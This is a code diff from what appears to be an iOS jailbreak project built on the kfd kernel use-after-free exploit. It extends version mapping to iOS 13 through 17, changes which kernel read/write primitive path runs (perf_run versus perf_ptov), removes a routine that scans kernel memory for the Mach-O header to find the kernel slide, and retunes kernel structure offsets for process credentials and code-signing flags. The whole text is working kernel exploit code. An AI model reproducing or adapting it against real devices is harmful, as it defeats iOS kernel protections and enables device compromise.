@@ -34,42 +34,48 @@ int isAvailable(void) {
     size_t len = sizeof(ptrAuthVal);
     assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
     if (@available(iOS 17.0, *)) {
-        return 14;
+        return 16;
     }
     if (@available(iOS 16.4, *)) {
+        if (isarm64e())
+            return 15;
+        return 14;
+    }
+    if (@available(iOS 16.2, *)) {
         if (isarm64e())
             return 13;
         return 12;
     }
-    if (@available(iOS 16.2, *)) {
+    if (@available(iOS 16.0, *)) {
         if (isarm64e())
             return 11;
         return 10;
     }
-    if (@available(iOS 16.0, *)) {
+    if (@available(iOS 15.4, *)) {
         if (isarm64e())
             return 9;
         return 8;
     }
-    if (@available(iOS 15.4, *)) {
+    if (@available(iOS 15.2, *)) {
         if (isarm64e())
             return 7;
         return 6;
     }
-    if (@available(iOS 15.2, *)) {
+    if (@available(iOS 15.1, *)) {
         if (isarm64e())
             return 5;
         return 4;
     }
-    if (@available(iOS 15.1, *)) {
-        if (isarm64e())
-            return 3;
-        return 2;
-    }
     if (@available(iOS 14.5, *)) {
-        return 1;
+        return 3;
     }
     if (@available(iOS 14.0, *)) {
+        return 2;
+    }
+    if (@available(iOS 13.5, *)) {
+        return 1;
+    }
+    if (@available(iOS 13.0, *)) {
         return 0;
     }
     return -1;
@@ -121,10 +127,11 @@ retry:
     }
     
     info_run(kfd);
-    if(isarm64e() && kfd->info.env.vid >= 8)
+    if(isarm64e() && kfd->info.env.vid >= 10) {
         perf_run(kfd);
-    if(isarm64e() && kfd->info.env.vid <= 7 && kfd->info.env.pplrw)
+    } else {
         perf_ptov(kfd);
+    }
     puaf_cleanup(kfd);
     
     return (uint64_t)(kfd);
@@ -309,50 +316,6 @@ uint64_t get_kw_object_uaddr(void) {
 }
 
 uint64_t get_kernel_slide(void) {
-    if(((struct kfd*)_kfd)->info.kernel.kernel_slide != 0)
-        return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
-    
-    static uint64_t _kernel_slide = 0;
-    
-    if(!_kernel_slide) {
-        
-        // get kslide
-        uint64_t field_uaddr = (uint64_t)(get_kw_object_uaddr()) + 0; // isa
-        uint64_t textPtr = *(volatile uint64_t*)(field_uaddr);
-        
-        struct mach_header_64 kernel_header;
-        
-        uint64_t _kernel_base = 0;
-        
-        for (uint64_t page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
-            struct mach_header_64 candidate_header;
-            kreadbuf_kfd(page, &candidate_header, sizeof(candidate_header));
-            
-            if (candidate_header.magic == 0xFEEDFACF) {
-                kernel_header = candidate_header;
-                _kernel_base = page;
-                break;
-            }
-        }
-        
-        if (kernel_header.filetype == 0xB) {
-            // if we found 0xB, rescan forwards instead
-            // don't ask me why (<=A10 specific issue)
-            for (uint64_t page = textPtr & ~PAGE_MASK; true; page += 0x4000) {
-                struct mach_header_64 candidate_header;
-                kreadbuf_kfd(page, &candidate_header, sizeof(candidate_header));
-                if (candidate_header.magic == 0xFEEDFACF) {
-                    kernel_header = candidate_header;
-                    _kernel_base = page;
-                    break;
-                }
-            }
-        }
-        
-        _kernel_slide = _kernel_base - KERNEL_BASE_ADDRESS;
-        ((struct kfd*)_kfd)->info.kernel.kernel_slide = _kernel_slide;
-    }
-    
     return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
 }
 
@@ -414,14 +377,14 @@ void offset_exporter(void) {
     off_ipc_space_is_table  = static_offsetof(ipc_space, is_table);
     off_ipc_entry_ie_object = static_offsetof(ipc_entry, ie_object);
     
-    if(kfd->info.env.vid <= 7) {
+    if(kfd->info.env.vid <= 9) {
         off_proc_proc_ro        = 0x20;
     }
-    if(kfd->info.env.vid <= 5) {
+    if(kfd->info.env.vid <= 7) {
         off_ipc_port_ip_kobject = 0x58;
         off_p_csflags           = 0x300;
     }
-    if(kfd->info.env.vid <= 3) {
+    if(kfd->info.env.vid <= 5) {
         off_task_itk_space  = 0x330;
         off_proc_ucred      = 0xd8;
     }
